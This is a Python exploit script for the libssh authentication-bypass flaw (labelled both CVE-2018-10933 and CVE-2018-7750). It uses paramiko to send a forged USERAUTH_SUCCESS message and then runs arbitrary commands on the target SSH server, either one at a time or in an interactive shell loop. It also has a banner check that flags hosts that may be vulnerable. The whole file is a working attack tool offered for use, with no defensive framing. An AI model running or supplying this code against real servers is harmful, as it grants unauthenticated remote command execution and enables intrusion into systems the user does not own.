import socket
import paramiko
import sys
import argparse 
from rich.console import Console
from rich.theme import Theme
import logging 
import time
import datetime     
custom_theme = Theme({"success":"green","error":"bold red"})
#config logs

console = Console(theme=custom_theme)

def cve_2018_7750(host,command, port=22):
    sock = socket.socket()
    

    try:
        sock.connect((str(host),int(port)))

        message = paramiko.message.Message()
        transport = paramiko.transport.Transport(sock)
        transport.start_client()

        message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
        transport._send_message(message)

        cmd = transport.open_session(timeout=10)
        cmd.exec_command(command)
        out = cmd.makefile("rb",2048)
        output = out.read()
        #output.close()
        #print((output).decode('utf-8'))
        
        console.print("{}".format((output).decode('utf-8')),style="success")
        
    except  Exception as e :
        print((e))
    except paramiko.SSHException as e:
        print(e)
    except socket.error:
        print("Unable to connect.")
        return 1
def test(host,port=22):
    try:
        sock = socket.create_connection((str(host), int(port)))
        recv = sock.recv(1024)
        
        sock.close()
        return recv
    except  Exception as e:
        print(e)
        exit()
    except socket.gaierror:
        parser.print_help()
        exit()
  



def terminal(host,port=22):
    while True:
        try:
            
            command = input(">>")
            
            cve_2018_7750(host,command=str(command),port=port)  
            console.print("CTRL-C [EXIT]",style="error")
        except  Exception as e:
            print((e))
        except  KeyboardInterrupt:
            console.print("\nGod Bye Friend",style="error")
            exit()
        
def check_arguments():
    try:
        parser = argparse.ArgumentParser(description="Script for the vulnerabilities CVE-2018-10933")
        group = parser.add_mutually_exclusive_group()
        parser.add_argument("host",type=str,help="the ip or domain address of ssh server")
        parser.add_argument("-p","--port",type=int,help="The port the service ssh, default [22]")
        parser.add_argument('-log', '--logfile', help='Logfile to write conn logs',action='store_false')
        group.add_argument("-t","--test",action="store_true",help="check the version of libSSH")
        group.add_argument("-c","--command",type=str,help="command to execute")
        group.add_argument("-i","--interactive",action="store_true",help ="open the interactive mode")
        args = parser.parse_args()

        host = args.host
        port = args.port
        if args.logfile:
            paramiko.util.log_to_file(f"logs/log_libssh_{host}_{datetime.datetime.now().isoformat()}.log")
            pass
        if args.test:

            res = test(host,port) if port else test(host,22)
            print("the version is {}".format(res.decode('utf-8')))
            
            print(f"The host {host} is posible vulnerable") if "SSH-2.0-libssh" in res.decode('utf-8') else print(f"The {host} not vulnerable")
        else:
            (cve_2018_7750(host=host,command=str(args.command),port=args.port) if args.command else terminal(host=host,port=args.port)) \
            if args.port else (cve_2018_7750(host=host,command=str(args.command)) if args.command else  terminal(host=host))
        
        

    except Exception as e:
        print((e))

        
            



def main():
    check_arguments()

if __name__ == '__main__':
    main()